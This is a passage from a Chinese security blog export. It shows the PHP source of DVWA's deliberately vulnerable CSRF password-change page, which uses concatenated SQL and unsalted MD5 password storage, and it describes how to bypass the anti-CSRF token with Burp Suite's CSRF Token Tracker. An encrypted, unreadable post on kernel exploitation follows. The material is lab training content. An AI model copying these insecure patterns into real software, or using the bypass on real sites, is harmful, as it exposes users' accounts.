<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$change = false;</span><br><span class="line">$request_type = &quot;html&quot;;</span><br><span class="line">$return_message = &quot;Request Failed&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &quot;POST&quot; &amp;&amp; array_key_exists (&quot;CONTENT_TYPE&quot;, $_SERVER) &amp;&amp; $_SERVER[&#x27;CONTENT_TYPE&#x27;] == &quot;application/json&quot;) &#123;</span><br><span class="line">    $data = json_decode(file_get_contents(&#x27;php://input&#x27;), true);</span><br><span class="line">    $request_type = &quot;json&quot;;</span><br><span class="line">    if (array_key_exists(&quot;HTTP_USER_TOKEN&quot;, $_SERVER) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $data) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $data)) &#123;</span><br><span class="line">        $token = $_SERVER[&#x27;HTTP_USER_TOKEN&#x27;];</span><br><span class="line">        $pass_new = $data[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $data[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (array_key_exists(&quot;user_token&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_new&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;password_conf&quot;, $_REQUEST) &amp;&amp;</span><br><span class="line">        array_key_exists(&quot;Change&quot;, $_REQUEST)) &#123;</span><br><span class="line">        $token = $_REQUEST[&quot;user_token&quot;];</span><br><span class="line">        $pass_new = $_REQUEST[&quot;password_new&quot;];</span><br><span class="line">        $pass_conf = $_REQUEST[&quot;password_conf&quot;];</span><br><span class="line">        $change = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($change) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $current_user = dvwaCurrentUser();</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . $current_user . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        $return_message = &quot;Password Changed.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        $return_message = &quot;Passwords did not match.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line"></span><br><span class="line">    if ($request_type == &quot;json&quot;) &#123;</span><br><span class="line">        generateSessionToken();</span><br><span class="line">        header (&quot;Content-Type: application/json&quot;);</span><br><span class="line">        print json_encode (array(&quot;Message&quot; =&gt;$return_message));</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;pre&gt;&quot; . $return_message . &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>checkToken</code>函数来实现 <code>Anti-csrf  token</code> 机制，用户每次访问更改密码页面时，服务器会返回一个随机的 <code>token</code>，之后每次向服务器发起请求，服务器会优先验证<code>token</code>，如果token正确，那么才会处理请求。所以我们在发起请求之前需要获取服务器返回的<code>user_token</code>，利用<code>user_token</code>绕过验证。这里我们可以使用<code>burpsuit</code>的<code>CSRF Token Tracker</code>插件可以直接绕过<code>user_token</code>验证。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152409701.png"
                      alt="image-20231012152409701"
                ></p>
<p>添加 <code>Host</code> 和 <code>Name</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/11/Web%E5%AE%89%E5%85%A8(0x2)CSRF/image-20231012152829738.png"
                      alt="image-20231012152829738"
                ></p>
<p>发送到 <code>repeater</code>，每次发送都会随机<code>token</code>的值，直接发送即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_Kernel及相关例题</title>
    <url>/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5558f6642fe6d9fa634bf643440f3a1bf33be415d039224470269d736500e6e8">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f63d479e637eae3b4c263955e20718ead88425721e59897576ca2ea7d87397cf595622433febed7f2acedcd78abc227bd6f9c15c23aa3661fae896ec9b986cf10dfc0ebc338bc805b8e83f4e1ffa98e18bdd674bdf64a9d4da411f12f3221df09943aaafab328379f1a281c8f603f5ce8c2498e84a680f92fe930fbfd1bd89ffadd3a080ed148e1f0bffb4f67f87ce19373fc040e3a0565f759923c78722c4e5210f81bb64c50118aa7746bbe8e677ed7ff3d8285b4bed913edaba6a37a689b718c06d2d427c7830930ce572c470c5e8a8edebcada707e2ea3db91ce20116f52f028006dca143ae9f1fb2e997171183776ddc1c7d61450fc6366537cc3b30b52f19c4bf95c4d785fc79173b022ca8874181f7d2a9de9be2309f9d7b59da3a694f96986993349ee0e146462ed695d291979ed78d7941e252b35fc9208cb1c1a8865982efc6d247b1cf4e71473de3aeb4780fbfba79f99c7f50c8fd14c1a5370f775be05ad75482b42dfd6114ca5b33f23dd5fbbd9e527b2e70e5f6c508bba23f26f94d04b1100d3fe42a3f7372f7022dc3c94f3b72f4f7266766a5754d595c35b3b3bd8efe3fd68c83c6c0a93b7ecdb54703bb45e4360bd20b597f827300cd76033f116ea8eef807a5091ee10e4aaa437732df27ca673bfc37f20d4164d0e657b7961f801cc34eb3e99a331004ade217707cebcbb4ee5ec57f00db24c9af4cb6b0551380b52ab631d48338988512936355e7449064962bf1ddf81e440a9da5cc7089d5a6067dc74ff039ea5da162c30387a3f671c487ee333d5fdac28464736e8240dd4ad2e7e9e1f93be4ea54d00dd29e217f12a33b543588f682192c46041d74e998b0d270f59a4f26bcb32f80d7e35293ff27f1a2b5201d70c191e8d4f10fdb6bd79000e75c1cededa725a23b3247d1a92de3462956bd3089fd59f9257b8d4b9df657d73e6ca65df8e09af7d0e066680429344e5c1f6e6381af83ee16d9c122645f16ba0a5ff4101c06f8378cad0d94aa7ca40e73a248494c1521479baefb41036a4cc166ce0b2967849b390fae116b6d7fc43b2302204589c66b072c8a9b367459b6a16cf9f7dd5d3bd71207e2233dafdba46c4847249ad61082906a932a8e2b2346816c17f820d69c537f0beed877e4991edd13b09d3b24651bf8ddd331a6c8bd45ad6b88df25065ec3cebaeb642ca38ab8e8ce9f02a7c1b868178952251cb149baedb681c956a7894c4f01899401797d88a6c6fba5cc20538a05d0388e20589a2c4cf40656ac24f67e322f921334d3166f44aa356921a1a86971d12bebd80d2d60b80ee32dcaf737ced8914187b030ac36993fd6a5e6b81398da6353d9a8b24c0b248324424c407864e23c179dafed0d7d12fac7fa88883fe989ecf7724be40aa2a716fcdf9a1e34bebd10d8b335db9c95fa6ba052109eee23b42398086675787e22529adf2ace6c3398195c9970e0b4e84bcc83c86b779336c11171ec057c106dc00b39e4a473d2b60873b52d7153626922b71712276c1e96f1cc2b7d3fc8fcb7668cdda47c79e0e114d316759740535acc2da5beecd8437240f52b71c5757c4355f19cf814640d900588b253bb86b41752678ca060cbfec592c5fb9000d4665b77293e6abb239c0654f1ffa35fdc799132ff317ef02da2c7ca8ced29e38d81209e873f862310184ff0bc9db564ef1858dc1dffa171456e2b6c8472db5ee2d5410e3cc17fe9a02432ddc90dbda43438cd86d1742f0e4b9ba69d375a6b4aae8063f1e6ef4acdc1bf6cada2348c91d3ac62cdd02f2c83f6117df7261f62f04ac9fe22870c34c1442d3acec2502c268a0dd93a2e2ba7415c2ba770f94550e8488c2d8c27d9a9115e0cad08452b88422f2fc56d2c5f7e95d75ef4102adc31235d8af82a0d2743cc14952626fdba5349251b53098fdfda2472609ec2fbd1dc205b67e12c44ba5e686c1af87907a600340378ca23f4707b007ea1ee36678f6c6697cc75d2a48ebd7c28237c778834b6d55c794d502f386098ee637b56f327882c2d4e14a29270b897746ddc8aaeeab795f4c4d66d6dec1c69879bc8eaf5127091985735aeb65e9593cadba233f395816f8b486d14ebafe9712a16d8e4fb3216e53eabe5df028a7c7170a24146dc13829bf5eb1e5e1d9b6d82fb34f30354631cc811d48510011b9c4e37fe6fcf7e231c1b12ee65da6b7de6eb86c7f81b713bf81d71eeffba4455c747c94458544125b96c745537f09b9f84eb11065a253ce18d7b7fb910e1f2c790e9d394a1af54bcef35c1d2ede288cebfbc98f5d9c0e08b5acef5ed89fe7fe23a97ef1c9f6d74491c350a6ca659c5eef0502f7630064d125f090e25da8aaf521dadeaf60699592e8b48254e18f7742d9aa3dc53737d72f4410860e38d06c3c637413ddd7ab3d161b728f9cef1a5d109574bdd7ac2309e481e853cd64c3ffc2bd5729b1362a1d35cf560429ed21d64496aa6e4e83cd69188fcdca7d47e2210b17a984e2fcb3b70c0ae2a9fe539d7120e7fa0197a2f715f726b5f17b39a87a13215971c98b51aee12a63261b4e770936d2e950000a47c11a32b441f4b06702c241d17d045dfe05fe0db247c261d4c26943efb5c73e9d76b54f5c2e97febda1a67d67b0bab0aa9fc8bb7f25709166033ab6ff7c6988cc03bc8f47264f64c68132a00bb42760d4ff92fc331a02953f8b3571fc229f591261f2ff92168a84d5cbdf6d9648fc35c607e98c9c9d37c644f13f1781dc77e00da3ea2a2a45b671451f0c66e92774c2e3ce34fae6635541c13d7124ad4c825bd7d644efd5bd445566306c980ebd1960cd27db6930b8af5d70a7d160aa3c3d264deb2753cbec0ee178600c1e7bfee5e8fa7ef54ff25b95928f55915f09a9e79d3bd3ac8fe72949cc51b0841a5ab8ab9c6ef662b8f78b492d7491294a1869e30a522d30e6c8a19c8c349dc1d3993eb6adff130efbb82029ca6ff520b5d6dd954a35ac21ace81db9accda30c48170a15b505a00d4bf004e8dc602e7271d7cfedcd51a477521cc4a43074b3c97b12692ffaba732c4923fbd3c580cfee684f25efe1ddeb622834b67e2f6fe0d00a4c79f0a7890dd89c53794fd1597bfe6e82a26dcc437cab8818cdd2e49e7bb67e48388c8cbeb9e7e112e01e165804780bfa4362d25131db35d3365e5850dface1304afb1c28b4d3e09cc1764d8afb6482a2b40dbf25683d0aa0a105f6b609b64ce6bfe19810dea64d78ce8a74d93baa144da6bfb44361052c9488ae2a245ed27c1e421d5ecc6a2c62b7619edf5b681a983e3f2c1901c4b49821ee90488748175eb0b296bf6687fd3e9628a3c5997176d6e3dde0f656c329281872ba3477b78bf1557f6fe843dc3f9126ffaed0460fd6084c1133dfce682089708d93b6a035ecb7dc5ce0ff1483e4ee146d3bf287432a789820a96fd67c165598cca789acc3997e7081cd3800342d97294e36d2783e57079981912b1058f06f6a73828e7ccaacba2e5905b4bcc39c74d3eb93f3f56bc9c5860b996ff9d8b540d86a5278a1c34e5c3fcb84c957820a402f63916697e13c884a3169650f1899799631936efdc395346eb81be4992019854fbc6df45037bd3a2b20f21a8b758a2f721f367ac4f35f833eaef21acbf7434adb8c07ea21df9a3927b87e9b771d0da975a311195b96f8b5411ea2331fcde8a0dba930346cf0be5c0c1c7c086537b2cad5960f10b25eb909f84857d63adcd42e36ee0a395e81bb371a6d8bc9d125e73615e8ab581f02388d50bb5b94001ed4d77fdbed7474a781d508657caa78b7ba05e7b15979338c5f3515a2108026a986b47ec6fca9fa2febbcf4ef3d23171e4cf0f22bb28b88f5c7fd38e0fcca1603bb836dc2b04651932aeb7242518c3f82f89a6a3cc12e4fe750e4a0ec703ff43f2c4c5f5c2acd35c8beef831f088e4312bb13934762f58b6bcc89cb860f9ee1cd3be814ebc8ba1ab4344aab7464e2edd51e6a2563f786156a3fd7bbaa6c3262f1108b369f79deacbe9209b53a1cc66032d1046974ccf7c55ac6e26bc97dbfa61717138f13cdce470c5a7215168e6c11d7c9f31aa477fa6bd3a70919a3ae6b2c268484fa57107fd910576010f40f9a7ba5d26ec1de29c531fa431f3b4b1063b8690040135d22659ecfe805fd5c64463161a0f6ee0300d76db108714a3411e2ab40a33dd2e5ca2c2af4db67831943462bd237f32d7b688890acbbe00fee02e7f3c44c1a30d06368c9832da430f6d454238f8e76fbd5e93da57a5604d9214fe93d48f678a3614292084ff3ae747daa8a04ad44e1e6fa374432f045e3fa66a7d921a451038fb730d652dc518606e8475c723670018b954abcc3cb493d4abb3b5c28f966d537b81d6fbcb675d4fe750518d2394c060853a7b72d968b2ddfb370bacf1a4be08958dc4a3fa8d2ee903230ce3ade648c256180038a5564a27d28d1912256dd6257561466f711bed57b57df020adf0aa41ec01441645f594e8b48bcbb0311057780dacb904bea28ecdc3258a0d55262d669fcb7629856e0f53338fb0ba0ba67ff624516ca4094ed6c3def7e8867b9e9608ef0e393530b204d2ed63d51e0c4274e871858d1399afb3182a8a6754dd4d1ad20e0567d91170669ae87de5d716c24bc193017ca49a3bd511361f379a4326ed59e34bbde12f0c449281f87d01a2c44902f2f7b2a698035081040200764f3c967a4e3642a4b4c3e72c0ffee58f8900368115298984de0b97b02c91131fb43d29bcdf5b23de102b23220399aa7ad7ec67c2025e2bf40d834fe520820da8d7ac3f895cfb62dc7c9af2ab8ae9cb7b2371134c9475c527f139b1032bf71df8185d74470f437924c2a7ccf577a913e61258520093bacb64ee0077357725676a8e0370fb7d23ff7806dbbd223441df240bc8011c00b7defc54fc181450fc0a517171f685c54dae32b54526762476663035034af89c2a40baf79224085cf194275d070b418c3437f12b0b4ef8c34c9c5d0a163046738c5bd38d0c70a7f0552353e7ac2573d335d858e7968dc5d8a3ac7d6857476210f64e4dcb749209dd13f8b9f41470e7cdb2d329a5cd68201bdda83c3a7446e4f088a866a72fb7c66f96f92b49aa7f36eb9524f7ceaadbf0b64ac4d52aeb7b2b2c670383774c62a0c21d3ddc6a29404517ca76a5d9f0c35fc6999335ffc049f3afc5f4fdfbb9c6c8400dc2f5febdd63e6f15c38e0528fe38f9386453c6664c69b23010ecbcd415f535ce4d2460e82e5c0395e8f6d9744fdc142efa2faf5fd17b82c7ff20e9f4cf976714469927f4944be80264884aa483020a80a8dba1c14004ca2bd3f41f33070bc700c2925a5122f648b2024eb8d54f7dc9661019e0b01d820203bd3f039d08d42d3cd7fe9e0ddd937b1e9abde48dba74d132c0d6838e5d109dbda7dbf6edf71c7493eb31367af96f8897dd127709a88ecfc35273fdf39f7fd1b52e7e072c82e2c6dfc5fb85198fb0f5fc84ef151561060d4b142c2db0639aedc8aadabbf6edbb8d86f61310551abbed3134ae2789093707e1586367a1cec0ddc99f103ebd509febb79cc0d571946231c89426421f07d36fe38105ce599ddbe3f906d22f45ff198de1ee92f784ced24993841f785579360c573e4e983f7697d40f3d51437fb081a5719ebfc46ac94cb48fd754327e87142650269d73837879e153840e937aa4d4dadcac3be662e0ed450347d90da498dadcd9cb0a417b55e1a14542a34de8d9121a1141bc3258c1d6b3962afb51031e5b5dafecddc2fcbc9aed9e41c04d65b14da2fbb1fffb9ec908482ce97a2d94929fd58a7b14cc3fdf9a6abe59de471a4e22056516d044e4791a23706950e1fa7081bf75b5162d206af9b42730e5a81aa85f998c312eeaec2884e498546354fbdceacc77b5dece9d679b39c47d65e177dbf730feb00ca3feb17f502fae12c3ee383acb1a0b4df304c4c2de0a0e4a2b4dc2d0fd274df57eaf56b4d161854475d7012922cbe76197260f8ce40068551311cdb0d3905359a75a6584dfa615c44e9b38260e439ac622e53b73442b802906d8d7d871a2b0739a00ec9ea0f280bab9d5bcdd1127de3732d5d8903192cb85a7af62617c621d203101c61eda9be30c7dca12cb6ec74479c7ace8a3e13a6805b4ec7db2abaafa90107e8b0a8d8e1e84330688f48884d204eadaafcac08014c92458d00297078324fd0c2c20343507978d7618949dd1d24b2bad59c934135555e620d0008c3550f6d112ea86ac0762ab824b1c03d3fa7b90e4497efb3065ed1868a29755272a74c83afaaef38e59139815f9446d22aa2469e8a3da2e00522dc6687e6ef84fe6b3cb212922688f0d451d93bf994fee6b14896e57bc4d9cd720f93d545ab57baaa3ad78f92122ebc9dd459aa9944790a5488a11ae8576b57afab182ee2453a85817d285c21ca93da76c2a06cc6d545feb41db7629eccdc9c420e4092baf9d4a6d74bb2e4b8e7362dd846661d167f0b8bc885cb1f64d62d8aae2f53db854e48d68d12ad907f15ab84a634ae3a97c1b3c880d8dc6673c0be8fc51729ed8ac9856b96324cfd058043f52050002ff76f78c8e23d7a39273b12f6a44e782a9d80b957129a357981ccb385ba17cf66e025d9656200e9c691f2c2b272ea2cd9fcc2ca4307006a0f07c1b9a099bda8e7be5d3f1443fca36c9a001825812f35294bc9b7c7ccec5e21757c9e5c4b78772c54df48269c105180b855f18a69d51e5848a710275643d44e65544031215a7f6c194bb1b32ca91db3980d83bc21e720f1ad4b5902cb533fe56e59ff53a895672f76790ec0252862220aad21606e5d4c3c4fc7128eff8ceb48e1db8a124049029b2752ffd569a5f4fe763ef98748bac457d917271d763e630d4c6cd2b61192e3cb75f80b5d082d6801a62481eb16e8e894749ae06c8eed3d7fd86100f3004c8a49ea7002dfacfbfd81b021bc1c7faa8fa8841b9c7eab16614d3931ad57836d148670a6a66670295885a8dc6a60467eebd6a9c93929606231204c23bf842b8e3b3c08fcdf356c57edaae322e41dde58854b64fd01381a5cfa1fd7b19186414c36cf0c3783070ed336655561ca7ff668964d5a445e876390c656095acf6a97d664d5b6802ac675487afcf5221124452ff2066ed253dabced1cab8ffb90a9bb2760361798e776a230431fe5e6f463c7a6b28cac7a91992f14cdc58c5e4ec101b856981a98fc884687a331463d590e618f51b79748aca70cfd0b4881ffb6277fa03d7c938c6a1bebe4958acf939f381e0c43cbc500b80236d3dba855d3198338a4e8983a3b7a8a3f78eafae5f11f19d980ff5ee1adb33a93b423ce89253503592755a0265a50427bc21b8b96b593da1faeacc167385d703d3d7a8e1275503f76d39dbea2c775c28df837388a3f96c3a6a18a16b9a6cb96176e9c50a00dc73133e21d960050ecfe0400b3fd3e3cfc0347efd7b9ffc6e31c614d47eb9c8a333c0a88226e2a6dadd938ad669d4e9171e17e3a75cc2b616d3436c18067b09847bdf505beddcd893cb270e10a9238b1a4cdbd5fdf8d9b0547745d9effc7ba2ec0012d4fee1a4dd33b9994c926a5af4e89e41c5b36366e6da3cedd6451ddde11647e72d0a3b1e5a945f69d928c7db9dcb8ab0b9218928df3fb5c25818c4fe64d3bd6028ceb12ab54b966eada7e47424546e1b16f95c12290a5543b51b386099cf1e34f170fecb0e45bc3f1271da813d5db9973e422f4c5ed40a3a2c70d54163239beb7e4a536b5dd8ee22e61888e2dc8187601b40f34e9c33e5a14126587a5a30ff7710d60f836a3060042a57a359c507df791ca58d6309ef5bc208ce769a3715631ccd1df972921fb1c928cdedb04308c802f8e9823b6cbfb7f8a08948f3073fe6d313d7303897ae185472efe8814abc6c36299fc1c8472b3515d59fd5b4ad473f281d516ce2545cdcbd271b93755215825676d67ca0da670d85c1ca961f4cbd41b501749a610a1628339bb397506547c0f7de4b9938a603278924304f04c05a4f6d32a3804c4f47629758e4a762538531fc020b9dc2d7d1b913ab038bf93e56cccba9373abd4ea958f7f0e4beb2dc72087ae1127c962378ecf0f301c1c2433b709875c7995f69f0130eb261dc1814096ccbe93f7d771ba0defafb3173caf7c13d917b94c136823993f3002aa3ee4d0c99bc884932aaf11fbf5670554473fccc10bed20d180dc6094a5d0e826e16ad32f9b912d0b7c8ed6b9caddbe1f9a2afdc4d569941449eb97d5d1221248471a867c96c496b0a7bc11d6ebba07737f7459f03dacf270a116a527beb65eae12e14e1c1ad3ebd0a247326ac7efbe02954eca6b8e9d6f89f778f592cbe4050275a482ec763fb18902628a959555bd1fb1facb265d7efe5a916eb845d4e9f6aeb849350f90ec190ebcbbfd991a9ea069a57b81569fc84f7a08820ee02e0ec2deb013647fdb882ebf455ca2bede3739fbd890dad73f3a12f4c509d4c426ecc564d3ae37a9b98c747333de3819d00926c94df6e436d73a3de11a93e7d5b6586f010065675f534d658662e63a1cefb6650863c8f8b516c1b2ce33e17d414a852dca2db5645c93466f43641f77c44738d822d38eab1e93affab886eb4d84e9a80c913771cc908335d071523f199e4da642d791e2fcb9b3d9148d4d071b680b82cc55d784db472a210631cf0b652e95658ebbb0179d04aefdca76441981f9d09880c3f3e7941a63b0571f9ad9441f140f02d9c6eb12777df315ebd1e7b459e8c933543c8cc2e17a4f6b06e46bdb7378485cdb2616436b0a649ada36b4432b8ad0d6ad672b3e1b72dc292681c285173e20be4090d556d5dab893e0fdd9317bf25b7550c936da297c809ad5dd54dbc81a49b50b6a61fc4a28dfbc276be3f1e1010e137a9bf3f49066c3e55130477cc1e64c56d5d7b057129e36d8444d77e531dfdf23af4b08aa5dc2203422fa202ff1dd56ec8eb2a4c3481545bb46daf0b69ff16a936c9ec100b00a4d3b1788e0d1df9f1bd104913ab2c9f1a54af42ccde4e6d06cb24bc3fc2ab3604d3d66167753ade996b67ac2da47c6c62270b59f98e415ef579c3119fecdc2d3da3c7c7e8f2b8ff344924f8a5a89ec0f100068431a5670bee33f83d16e6dc7d9ac17080413ce463a145f737b5aaf53c3075385824e08df481fda55c04e4d40bbe11d0e9730c52f4e48fd3dc6670ca53fd52327baaf009ec6e2aa88208d093ec12635250606fc4ecba04b4a7481db7327aedfe2fe4bf1d4d4ab0ea0d60c951c4406922f66e205d7c3ed63bcdad8cae113413c98981bcf35f6d8f29785d4b1af7e212557ba5f4fabb3538958be80d5295d2096c09626e25b33f79981f8dc2003289851808897f2511d4816ead8e58305a2341fbc4552eeed537c58b188f098e67242600b428ef0be91ed4d9764685b0ba90ea58d0758fcfbe73a6050a2bf96a6e0ee1e9a3c54f2afc6a76be31b6ccaf6aad3a9bf07bd72a5b59f8d54ed8cdcd9698021576585a3cc377501002a6fedae99a9ea49ec0105313fc00ac232e0da21a727e73236bfbd1917a9f8e5556430677f63a62d7a508daa275eb5fb294c4fe84e20672eb22ac240a021aed84a8cc117f9c12afe1fa702324cc87ede28a75bd77ed20be09eb24c2ee357703c215ad284a411cd3834a9e953929a90210247a54a750bfbac4d86426c356dc9e015842aab8f8cf11b68612ce26c6d745f31ff513e10c3760f2f4b5fadcb9ef093b3f785e0b4a3e9b2e5ce61d0e870a7a2a7e3abdc6eb29e916bae6da91048a8e8d54c9b7eb3328fcad950dcaa003284269d2c034b09185c2a1d349d6ff62de9b93c902d354a5edf59ecb665f0155a5ad83eda7a7514d833d7e69d9bd88fee8dfab4be59e173ac3e8fb2194831c2baaac3127af9ae88c18ed450f8c8b69702858875b0aecd7346c8c171896ce29e009ecff81b405c46ac7c574d3e6832c1ee1b315587b8a54723188d9d38aec8d851d9d09f1530911748ecf8f8720d0858585fdccc029227e9aec28d4732693581e197efca7040281512d5d25444e3634df478febcb81ad03b6c9ef1ca9cbe77d9461a898704177534b0a888061175de0a20b6ee64724a980ae6b725472ef1affba67c850d7e05e93c7cc52786976e206dcf544bdb468cc5655415a3ac93ae4359fd262949675afc1c4dd741558710e523e38058844b920e450967d711b803e902fb37c99bbc59a5304f8c9d87cfb591939befa6430cd8fe4e14f0b680566332b2d79f78d571d3de64bbde8fb29da139eaca0445b2e8e1a2daca971823ed8b107f6713dd0ddebcfbb9675b628b646fdd2f3cc57553cc02cf535225f322a775ed5cf0dea683602230b58a7e752bdd8110f0372354e347382f778312a26624ed63af397af1d2cc678cf7eeb26bdb69a40a7cfddef7165e3e492f65baed0db615983fa25b2ef0b059f0b9edad84f81660c71ce4a69989b07c87fe53de8e492fc68948233b7a345549b530b87e4a8ed0fc63e657907ac1c848240842c6580e511e2f74113f5b48aaaeaa720c89dd6b2f102d4495f11f7079a9b29feb991410b8da415fddc5b4aad67d2f1da0613eb37874a2591ab575c244a3bab696915f197bae6783d40ae78972566ed72a89ee8b8b2eca11458f796cbcee8000de7e7755dfca9b868704099eac294e074a3f65f1abb83e3a45d8f8f2d0343c762d127576fd87e8646a8b29e78fe5592a5e3d6b3bc6f7ffa44d2eae614c6e20b4bb47394bd0da28d0dd898f443992460d8915e4894a2744a9e55597c7a4ece9323296bd2d09786a4f82c78e5372c54e4f0f2fd4961376622dbc7d12bc2e17bb16686cad751409dd30bb4a66014c05a9fb0b0c2c3df87b27972f9df6dd279681a5bcee532f759d2866efca00c782585e5d0ca2e8b10bda0ed2ffb40b8e1f67f39d17a51c553f3ad1730dfcd243d5c4f0b382b23ecd863d148d4f989390965b2957cb451c0aac9505c5e238c330a6196d34a927e629d9c45262f696685c6e8fcbe24fcd20d2dbccea15b62ada25c8c0e119aff504c730ebaaf3e6c75c34510cd91a38aeb1a7c659f2f57c88faa1d2e5c3ee250dd8ede79fb1b100f4f80da592e9421f1a4cb2734fc76aabb1ab2ff5a7f6ee461860b00a0672a180043109024150e2fb3ed1edb81756816ecad87bc138feccafd663beeefbd2f2215a457cb00c61138248f8b073ed9f5854da39af5f12abd43dd284da8723ed7f4500ac3d8bf339252cae3c1ab5f0fadc34c54b397b38b384bccd81e9bb70857a7bc2cf822a509c1b4cc8400622f8e09177c652ce0f69a60d544e3439a50ddcdfe69a1ba803a072d42aaf87333ae82d94b7cab0f2b8a8ae8170741107c9d69fff67eebabe1594f666bd8fd867a268495a1ab806b692cab134f8c0abc7fe71ba2dab0128ce8b2f437a495583b941a3287f611c163d8c204c2bbfbd2c0857ea707e8446d292ac579b277885c96d6eb90eb65fae0bd4d7f210662eef503058ae846db42652c83cb49d4f2ebcba75ad028c1665674ba4c4e02336b0dfb4537df1c79104067371ddc3056763b63dad114493015618a0c84fd98861a7dc22b5e50cc3e59ad15e21a82266c54f3a9f2af7988cfa2a69e4628231a67f5b4b9f1b18888c6f950a85235e09ab28cb724e44a812f622c3ab74c6fe5e327e761a7ceeac3e9a26218f633bc27bf00788015b3279b2ac10d3812b0cd15339a1aeb83f9fa6e4f8ace8a5ff08ff25325d9961a65ed43558c6909e14773bd7a2461b486b169e46a7d70c18aea237393125fb13aa4bbfac365473730cb097f89d280ddf8df2741246fdfce308d102e762043fe948b5ddd929db8d26e5bfd14ea267d65666151594dc864d2db2ae69ee66f4fc26c90e59b4d47c86c6968c5b584ee63b653a62259ec3c20a65a303855d401daa09ae78326355a20e2481a0087a5d825c16f38b958599ba99c30c185a90ddd699975dce3353a0fd3572dd19511126322637cb84b7b0fa584d483d50cd1838b1e1e5c9a35daba220663162a7f317cb79b9d2e0a9d614d95d5aa1d29c9699a5e6ce973ff40362770b8ce1b4bafeae1f530ae232b4f744f44f495e6d3caa3a9339c411fc955340fa12c9828abf1688557a08c6028788934ae5fc5255058c73d3dd7672578cc089d0911c58a322c71fda562f8c02abeb1269b399ba589d77bf64d73a4eeb1c4701c848ebb1a1f067b65feb93c5ecabe32e00ff84862132485e3a9634c0c4a9411c62decae673469aaf20994ce8595d5a4ca0428cd3babca4e454fdc9338a15bbc4e814c45604835e477d77c1e85081f8c760cc2fb27af5342ea39e4f51a0753d02032d357de0c4c200d53007d3ee4db075f883e8524d461e8af93180c4a26b9a7faaa65f3613091859335bb0b8b3236415b434ec5e966b2fbbd9edd71b4c8d71ab103d283ccaac4aaf2b27615c5c44b27c31b24674635d95c8235532ee211ff3ce19ed00350f478d3df1be4b4c6ef2c1d143aad8f9c6886c27b93ab339670c90b170f91104fc73eb2ccbfe978b47a596e06784dc7efce0ab3e50895d723ec4a8f18ff74fc902657da9f1d331b4c4ade1e261787e8980225d77e99fdb7217013fd542f7e3a74a8e677fbcad12d887f32a0dbf58bf7848d55b2e0343a9a3d55297798100cee4e8e292d8e4ab33f49381ddf6e873c90d56c6362f6e0d48ef08707417b5fa35255b4c0b3550da1e3ffcf6d666c9ba6494dd5c369edfadc25a5e1d0cedcc097322e0b5ed15f54e9d7368ac9cd371ea82016925643c43709a6f26c532bc3758cc16a3ffce7b102ca7eabfd077b131679a745c6d160e6b44785eb5fa4be96d9286d6b1c039e985fdf2cd1dcd114ae7cef780115b3eb1d32be19fc40d8969bfc931859ae8afedc9c9e204b54c3e5475adebdd22a381cfe8f5a322b7340266fccc11c804037111240a9e2ecb26d9ddf67a9d6e8692d2febb93b37c53a4d5ad5b4fec97c23edd0b12a85a9abe5b6ef9165cb70a4a108dd01f7142e61ed356bf56ef7a5ef7190b36c4fda4f29ff797c0d2047c6edb27019ee119dd091dc9705fd25736621a3644a477d44392ae55a